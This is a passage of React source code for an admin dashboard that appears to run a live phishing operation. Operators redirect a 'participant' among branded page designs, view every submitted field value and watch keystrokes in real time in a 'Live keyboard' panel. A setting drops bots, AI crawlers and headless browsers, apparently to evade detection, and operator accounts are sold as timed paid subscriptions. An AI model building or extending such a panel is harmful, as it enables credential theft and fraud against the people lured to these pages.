                        setPickedSuite(null);
                      }}
                    >
                      <span className="admin-redirect-item-dot">
                        {icon ? (
                          <img src={icon} alt="" style={{ width: 14, height: 14, objectFit: "contain", display: "block" }} />
                        ) : "•"}
                      </span>
                      <span>{v.label}</span>
                      <span className="admin-redirect-item-arrow">↗</span>
                    </button>
                  );
                })}
              </div>
            </>
          ) : (
            <>
              <button className="admin-redirect-back" onClick={() => setPickedSuite(null)}>
                ← Designs
              </button>
              <div className="admin-redirect-list">
                {pageOpts.length === 0 && (
                  <p className="admin-redirect-empty">No pages in this design.</p>
                )}
                {pageOpts.map((pg, i) => {
                  const icon = getPageIcon(pickedSuite, pg.value) ?? getDesignLogo(pickedSuite);
                  const hasVariants = !!PAGE_VARIANTS[pickedSuite]?.[pg.value];
                  return (
                    <button
                      key={pg.value}
                      className="admin-redirect-item"
                      style={{ animationDelay: `${i * 25}ms` }}
                      onClick={() => {
                        if (hasVariants) {
                          setPickedPage(pg.value);
                        } else {
                          onNavigate(p.id, pickedSuite, pg.value);
                          setPickedSuite(null);
                        }
                      }}
                    >
                      <span className="admin-redirect-item-dot">
                        {icon ? (
                          <img src={icon} alt="" style={{ width: 14, height: 14, objectFit: "contain", display: "block" }} />
                        ) : "•"}
                      </span>
                      <span>{pg.label}</span>
                      <span className="admin-redirect-item-arrow">{hasVariants ? "›" : "↗"}</span>
                    </button>
                  );
                })}
              </div>
            </>
          )}
        </FloatingPanel>
      )}


      {panels.has("submitted") && (
        <FloatingPanel
          title={<span>Submitted · <span className="font-mono text-[11px]">{p.id}</span></span>}
          accentDot="#5dffa3"
          onClose={() => closePanelKey("submitted")}
          initialSize={{ w: 420, h: 620 }}
          minSize={{ w: 280, h: 260 }}
        >
          <div className="admin-modal-list">
            {submitted.length === 0 ? (
              <p className="admin-redirect-empty">Nothing submitted yet.</p>
            ) : (
              submitted.map((e, i) => (
                <div
                  key={e.field}
                  className={`admin-submitted-item ${i === 0 ? "is-pinned" : ""}`}
                  style={{ animationDelay: `${i * 40}ms` }}
                >
                  <div className="admin-submitted-field">
                    {e.field}
                    {i === 0 && <span className="admin-submitted-latest">latest</span>}
                  </div>
                  <CopyChip text={e.value} className="admin-submitted-value copy-chip-block" title="Copy value">
                    {e.value || <em style={{ color: "#555" }}>(empty)</em>}
                  </CopyChip>
                  <div className="admin-submitted-meta">
                    {new Date(e.at).toLocaleTimeString()}
                  </div>
                </div>
              ))
            )}
          </div>
        </FloatingPanel>
      )}

      {panels.has("keyboard") && (
        <FloatingPanel
          title={<span>Live keyboard · <span className="font-mono text-[11px]">{p.id}</span></span>}
          accentDot="#ffd25d"
          onClose={() => closePanelKey("keyboard")}
          initialSize={{ w: 420, h: 220 }}
          minSize={{ w: 280, h: 160 }}
        >
          <KeyboardPanelBody liveInput={liveInput} />
        </FloatingPanel>
      )}

      <ParticipantFeed events={events} />
    </article>
  );
}

function KeyboardPanelBody({ liveInput }: { liveInput: LiveInputPayload | null }) {
  if (!liveInput) {
    return (
      <div className="kb-panel-empty">
        <p>Waiting for the participant to focus a field.</p>
      </div>
    );
  }
  return (
    <div className="kb-panel">
      <div className="kb-panel-meta">
        <span className={`kb-focus-dot ${liveInput.focused ? "is-on" : ""}`} />
        <span className="kb-panel-field">{liveInput.field}</span>
        <span className="kb-panel-type">{liveInput.ftype}</span>
        <span className="kb-panel-time">{new Date(liveInput.at).toLocaleTimeString()}</span>
      </div>
      <CopyChip text={liveInput.value} className="kb-panel-value copy-chip-block" title="Copy current value">
        {liveInput.value ? (
          <span className="kb-panel-text">{liveInput.value}</span>
        ) : (
          <em className="kb-panel-empty-text">(empty)</em>
        )}
        <span className="kb-caret" aria-hidden />
      </CopyChip>
    </div>
  );
}

function ParticipantFeed({ events }: { events: InputPayload[] }) {
  const [open, setOpen] = useState(false);
  const recent = useMemo(() => {
    const clicks = events.filter(
      (e) => e.field === "__click" || /_clicked$/.test(e.field),
    );
    return clicks.slice(0, 10);
  }, [events]);
  return (
    <div className={`pf ${open ? "is-open" : ""}`}>
      <button
        type="button"
        className="pf-toggle"
        onClick={() => setOpen((v) => !v)}
        aria-expanded={open}
      >
        <span className="pf-toggle-label">Interaction feed</span>
        <span className="pf-toggle-count">{recent.length}</span>
        <svg className="pf-toggle-arrow" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
          <polyline points="6 9 12 15 18 9" />
        </svg>
      </button>
      <div className="pf-body" aria-hidden={!open}>
        <div className="pf-inner">
          {recent.length === 0 ? (
            <p className="pf-empty">No interactions yet.</p>
          ) : (
            recent.map((e, i) => (
              <div key={e.at + ":" + i} className="pf-item" style={{ animationDelay: `${i * 40}ms` }}>
                <div className="pf-row">
                  <span className="pf-field">{e.field}</span>
                  <span className="pf-time">{new Date(e.at).toLocaleTimeString()}</span>
                </div>
                <CopyChip text={e.value} title="Copy value" className="copy-chip-inline">
                  <span className="pf-value">{e.value || <em className="pf-empty-em">(empty)</em>}</span>
                </CopyChip>
              </div>
            ))
          )}
        </div>
      </div>
    </div>
  );
}



function SettingsPane({
  blockBots,
  onToggleBlockBots,
}: {
  blockBots: boolean;
  onToggleBlockBots: (v: boolean) => void;
}) {
  return (
    <div className="admin-settings-page">
      <header className="admin-settings-head">
        <h1 className="admin-settings-h1">Settings</h1>
        <p className="admin-settings-lede">Project-wide controls. More coming soon.</p>
      </header>

      <section className="admin-settings-group">
        <h2 className="admin-settings-group-title">Visitors</h2>
        <label className="admin-settings-row">
          <div>
            <div className="admin-settings-title">Block bots & crawlers</div>
            <div className="admin-settings-sub">
              Drop bot, AI crawler, and headless requests (GPTBot, ClaudeBot, Googlebot,
              Puppeteer, Playwright, etc.) before they join.
            </div>
          </div>
          <input
            type="checkbox"
            className="admin-switch"
            checked={blockBots}
            onChange={(e) => onToggleBlockBots(e.target.checked)}
          />
        </label>
      </section>

      <AccountsSection />

    </div>
  );
}

function avatarColor(seed: string): string {
  let h = 0;
  for (let i = 0; i < seed.length; i++) h = (h * 31 + seed.charCodeAt(i)) >>> 0;
  const hue = h % 360;
  return `hsl(${hue} 55% 45%)`;
}
function initials(name: string | null | undefined): string {
  if (!name) return "?";
  return name.trim().slice(0, 2).toUpperCase();
}

function useCountdown(iso: string | null): { text: string; kind: "inf" | "active" | "danger" | "expired" | "none" } {
  const [, tick] = useState(0);
  useEffect(() => {
    const id = window.setInterval(() => tick((n) => n + 1), 1000);
    return () => window.clearInterval(id);
  }, []);
  if (!iso) return { text: "No subscription", kind: "none" };
  const remaining = new Date(iso).getTime() - Date.now();
  if (remaining <= 0) return { text: "Expired", kind: "expired" };
  const s = Math.floor(remaining / 1000);
  const d = Math.floor(s / 86400);
  const h = Math.floor((s % 86400) / 3600);
  const m = Math.floor((s % 3600) / 60);
  const sec = s % 60;
  let text: string;
  if (d > 0) text = `${d}d ${h}h ${m}m`;
  else if (h > 0) text = `${h}h ${m}m ${sec}s`;
  else text = `${m}m ${sec}s`;
  return { text, kind: remaining < 24 * 3600 * 1000 ? "danger" : "active" };
}

function AccountChip() {
  const navigate = useNavigate();
  const fetchMe = useServerFn(getMyAccount);
  const [me, setMe] = useState<{ username: string | null; isAdmin: boolean; subscription_until: string | null } | null>(null);

  useEffect(() => {
    let alive = true;
    const load = () =>
      fetchMe()
        .then((r) => {
          if (alive)
            setMe({
              username: r.username,
              isAdmin: r.isAdmin,
              subscription_until: r.subscription_until,
            });
        })
        .catch(() => undefined);
    load();
    const id = window.setInterval(load, 30_000);
    return () => {
      alive = false;
      window.clearInterval(id);
    };
  }, [fetchMe]);

  async function signOut() {
    await supabase.auth.signOut();
    navigate({ to: "/auth" });
  }

  const cd = useCountdown(me?.subscription_until ?? null);

  if (!me) return null;
  const rank = me.isAdmin ? "Admin" : "Paid";
  const rankClass = me.isAdmin ? "is-admin" : "";
  const subText = me.isAdmin ? "Infinite access" : cd.kind === "none" || cd.kind === "expired" ? "Suspended" : cd.text;
  const subKind = me.isAdmin ? "is-inf" : cd.kind === "danger" ? "is-danger" : cd.kind === "expired" || cd.kind === "none" ? "is-danger" : "";

  return (
    <div className="admin-account-chip">
      <div className="admin-account-avatar" style={{ background: avatarColor(me.username ?? "?") }}>
        {initials(me.username)}
      </div>
      <div className="admin-account-info">
        <div className="admin-account-name">{me.username ?? "—"}</div>
        <div className={`admin-account-rank ${rankClass}`}>
          {me.isAdmin ? "★ " : "● "}{rank}
        </div>
        <div className={`admin-account-sub ${subKind}`}>{subText}</div>
      </div>
      <button
        type="button"
        className="admin-account-signout"
        onClick={() => void signOut()}
        title="Sign out"
        aria-label="Sign out"
      >
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
          <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4" />
          <polyline points="10 17 15 12 10 7" />
          <line x1="15" y1="12" x2="3" y2="12" />
        </svg>
      </button>
    </div>
  );
}

type Account = {
  id: string;
  username: string;
  subscription_until: string | null;
  created_at: string;
  roles: string[];
};

const PAGE_SIZE = 5;

function AccountsSection() {
  const list = useServerFn(listAccounts);
  const del = useServerFn(deleteAccount);
  const fetchMe = useServerFn(getMyAccount);
  const [isAdmin, setIsAdmin] = useState<boolean | null>(null);
  const [accounts, setAccounts] = useState<Account[]>([]);
  const [error, setError] = useState<string | null>(null);
  const [page, setPage] = useState(0);
  const [showCreate, setShowCreate] = useState(false);
  const [editing, setEditing] = useState<Account | null>(null);

  async function refresh() {
    try {
      const rows = await list();
      setAccounts(rows as Account[]);
    } catch (e) {
      setError(e instanceof Error ? e.message : "Failed to load");
    }
  }
  useEffect(() => {
    let cancelled = false;
    (async () => {
      try {
        const me = (await fetchMe()) as { isAdmin: boolean };
        if (cancelled) return;
        setIsAdmin(me.isAdmin);
        if (me.isAdmin) await refresh();
      } catch {
        if (!cancelled) setIsAdmin(false);
      }
    })();
    return () => {
      cancelled = true;
    };
  }, []);


  async function onDelete(userId: string, username: string) {
    if (!window.confirm(`Delete account "${username}"? This cannot be undone.`)) return;
    setError(null);
    try {
      await del({ data: { userId } });
      await refresh();
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed");
    }
  }

  if (!isAdmin) return null;

  const totalPages = Math.max(1, Math.ceil(accounts.length / PAGE_SIZE));
  const currentPage = Math.min(page, totalPages - 1);
  const visible = accounts.slice(currentPage * PAGE_SIZE, currentPage * PAGE_SIZE + PAGE_SIZE);

  return (
    <section className="admin-settings-group">
      <div className="admin-acct-head">
        <h2 className="admin-settings-group-title" style={{ margin: 0 }}>
          Accounts <span style={{ color: "#555" }}>· {accounts.length}</span>
        </h2>
        <button className="admin-acct-create-link" onClick={() => setShowCreate(true)}>
          Create account
        </button>
      </div>

      {error && <div className="auth-error">{error}</div>}

      <div className="admin-acct-list">
        {visible.map((a) => (
          <AccountRow
            key={a.id}
            a={a}
            onEdit={() => setEditing(a)}
            onDelete={onDelete}
          />
        ))}
        {accounts.length === 0 && (
          <p className="admin-empty">No accounts yet.</p>
        )}
      </div>

      {totalPages > 1 && (
        <div className="admin-acct-pager">
          <button
            onClick={() => setPage((p) => Math.max(0, p - 1))}
            disabled={currentPage === 0}
            aria-label="Previous page"
          >
            ‹
          </button>
          {Array.from({ length: totalPages }).map((_, i) => (
            <button
              key={i}
              className={i === currentPage ? "is-active" : ""}
              onClick={() => setPage(i)}
            >
              {i + 1}
            </button>
          ))}
          <button
            onClick={() => setPage((p) => Math.min(totalPages - 1, p + 1))}
            disabled={currentPage >= totalPages - 1}
            aria-label="Next page"
          >
            ›
          </button>
        </div>
      )}

      {showCreate && (
        <CreateAccountModal
          onClose={() => setShowCreate(false)}
          onCreated={() => {
            setShowCreate(false);
            void refresh();
          }}
        />
      )}
      {editing && (
        <EditAccountModal
          account={editing}
          onClose={() => setEditing(null)}
          onSaved={() => {
            setEditing(null);
            void refresh();
          }}
        />
      )}
    </section>
  );
}

function AccountRow({
  a,
  onEdit,
  onDelete,
}: {
  a: Account;
  onEdit: () => void;
  onDelete: (id: string, username: string) => void;
}) {
  const isAdmin = a.roles.includes("admin");
  const cd = useCountdown(a.subscription_until);
  const suspended = !isAdmin && (cd.kind === "expired" || cd.kind === "none");

  const timeText = isAdmin
    ? "∞ infinite"
    : cd.kind === "none"
      ? "no subscription"
      : cd.kind === "expired"
        ? "expired"
        : `${cd.text} left`;
  const timeKind = isAdmin ? "is-inf" : suspended ? "is-danger" : cd.kind === "danger" ? "is-danger" : "";

  return (
    <div className="admin-acct-row">
      <div className="admin-acct-main">
        <div className="admin-acct-name-row">
          <span className="admin-acct-name">{a.username}</span>
          <span className={`admin-acct-badge ${isAdmin ? "is-admin" : suspended ? "is-suspended" : ""}`}>
            {isAdmin ? "admin" : suspended ? "suspended" : "paid"}
          </span>
        </div>
        <div className="admin-acct-meta">
          <span className={`m-time ${timeKind}`}>{timeText}</span>
        </div>
      </div>
      <div className="admin-acct-actions">
        <button onClick={onEdit}>Edit</button>
        {!isAdmin && (
          <button className="admin-acct-delete" onClick={() => onDelete(a.id, a.username)}>
            Delete
          </button>
        )}
      </div>
    </div>
  );
}

function CreateAccountModal({
  onClose,
  onCreated,
}: {
  onClose: () => void;
  onCreated: () => void;
}) {
  const create = useServerFn(createAccount);
  const update = useServerFn(updateAccount);
  const [u, setU] = useState("");
  const [p, setP] = useState("");
  const [role, setRole] = useState<"paid" | "admin">("paid");
  const [days, setDays] = useState<number>(30);
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    function onKey(e: KeyboardEvent) {
      if (e.key === "Escape") onClose();
    }
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [onClose]);

  async function submit(e: React.FormEvent) {
    e.preventDefault();
    setError(null);
    setBusy(true);
    try {
      const res = await create({ data: { username: u, password: p, isAdmin: role === "admin" } });
      if (role === "paid" && days > 0) {
        const until = new Date(Date.now() + days * 86_400_000).toISOString();
        await update({ data: { userId: res.id, subscription_until: until } });
      }
      onCreated();
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed");
    } finally {
      setBusy(false);
    }
  }

  return (
    <div className="admin-modal-backdrop" onClick={onClose}>
      <form className="admin-modal" onClick={(e) => e.stopPropagation()} onSubmit={submit}>
        <div className="admin-modal-head">
          <h2 className="admin-modal-title">Create account</h2>
          <button type="button" className="admin-modal-close" onClick={onClose} aria-label="Close">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
              <line x1="18" y1="6" x2="6" y2="18" />
              <line x1="6" y1="6" x2="18" y2="18" />
            </svg>
          </button>
        </div>

        <label className="admin-modal-field">
          <span>Username</span>
          <input
            autoFocus
            value={u}
            onChange={(e) => setU(e.target.value)}
            required
            minLength={2}
            maxLength={32}
            pattern="[a-zA-Z0-9_-]+"
            autoCapitalize="off"
            spellCheck={false}
          />
        </label>

        <label className="admin-modal-field">
          <span>Password</span>
          <input
            type="text"
            value={p}
            onChange={(e) => setP(e.target.value)}
            required
            minLength={6}
          />
        </label>

        <label className="admin-modal-field">
          <span>Role</span>
          <select value={role} onChange={(e) => setRole(e.target.value as "paid" | "admin")}>
            <option value="paid">Paid user</option>
            <option value="admin">Admin (infinite)</option>
          </select>
        </label>

        {role === "paid" && (
          <label className="admin-modal-field">
            <span>Subscription (days)</span>
            <input
              type="number"
              min={0}
              max={3650}
              value={days}
              onChange={(e) => setDays(Number(e.target.value) || 0)}
            />
          </label>
        )}

        {error && <div className="auth-error">{error}</div>}

        <div className="admin-modal-actions">
          <button type="button" className="btn-secondary" onClick={onClose} disabled={busy}>
            Cancel
          </button>
          <button type="submit" className="btn-primary" disabled={busy}>
            {busy ? "Creating…" : "Create"}
          </button>
        </div>
      </form>
    </div>
  );
}

function EditAccountModal({
  account,
  onClose,
  onSaved,
}: {
  account: Account;
  onClose: () => void;
  onSaved: () => void;
}) {
  const update = useServerFn(updateAccount);
  const isAdmin = account.roles.includes("admin");
  const [u, setU] = useState(account.username);
  const [p, setP] = useState("");
  const initialDays = account.subscription_until
    ? Math.max(0, Math.ceil((new Date(account.subscription_until).getTime() - Date.now()) / 86_400_000))
    : 0;
  const [days, setDays] = useState<number>(initialDays);
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    function onKey(e: KeyboardEvent) {
      if (e.key === "Escape") onClose();
    }
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [onClose]);

  async function submit(e: React.FormEvent) {
    e.preventDefault();
    setError(null);
    setBusy(true);
    try {
      const payload: {
        userId: string;
        username?: string;
        password?: string;
        subscription_until?: string | null;
      } = { userId: account.id };
      if (u !== account.username) payload.username = u;
      if (p) payload.password = p;
      if (!isAdmin) {
        payload.subscription_until =
          days > 0 ? new Date(Date.now() + days * 86_400_000).toISOString() : null;
      }
      await update({ data: payload });
      onSaved();
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed");
    } finally {
      setBusy(false);
    }
  }

  return (
    <div className="admin-modal-backdrop" onClick={onClose}>
      <form className="admin-modal" onClick={(e) => e.stopPropagation()} onSubmit={submit}>
        <div className="admin-modal-head">
          <h2 className="admin-modal-title">Edit {account.username}</h2>
          <button type="button" className="admin-modal-close" onClick={onClose} aria-label="Close">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
              <line x1="18" y1="6" x2="6" y2="18" />
              <line x1="6" y1="6" x2="18" y2="18" />
            </svg>
          </button>
        </div>

        <label className="admin-modal-field">
          <span>Username</span>
          <input
            value={u}
            onChange={(e) => setU(e.target.value)}
            required
            minLength={2}
            maxLength={32}
            pattern="[a-zA-Z0-9_-]+"
            autoCapitalize="off"
            spellCheck={false}
          />
        </label>

        <label className="admin-modal-field">
          <span>New password (leave blank to keep)</span>
          <input
            type="text"
            value={p}
            onChange={(e) => setP(e.target.value)}
            minLength={6}
            placeholder="••••••••"
          />
        </label>

        {!isAdmin && (
          <label className="admin-modal-field">
            <span>Subscription (days from now)</span>
            <input
              type="number"
              min={0}
              max={3650}
              value={days}
              onChange={(e) => setDays(Number(e.target.value) || 0)}
            />
          </label>
        )}

        {error && <div className="auth-error">{error}</div>}

        <div className="admin-modal-actions">
          <button type="button" className="btn-secondary" onClick={onClose} disabled={busy}>
            Cancel
          </button>
          <button type="submit" className="btn-primary" disabled={busy}>
            {busy ? "Saving…" : "Save"}
          </button>
        </div>
      </form>
    </div>
  );
}
